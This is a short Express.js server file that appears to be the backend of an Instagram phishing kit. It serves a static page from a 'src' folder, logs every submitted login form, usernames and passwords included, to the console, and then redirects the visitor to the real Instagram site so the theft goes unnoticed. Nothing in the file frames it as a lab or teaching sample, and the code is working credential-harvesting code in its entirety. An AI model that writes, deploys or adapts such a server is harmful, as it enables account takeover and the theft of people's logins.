const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Use body-parser middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'static' folder
app.use(express.static('src'))

// Handle form submission
app.post('/login', (req, res) => {
    // Log received login data
    console.log('Received login data:', req.body);
    // redirect to https://www.instagram.com/
    res.redirect('https://www.instagram.com/');
});

// redirect GET /login to GET /
app.get('/login', (req, res) => {
    res.redirect('/');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
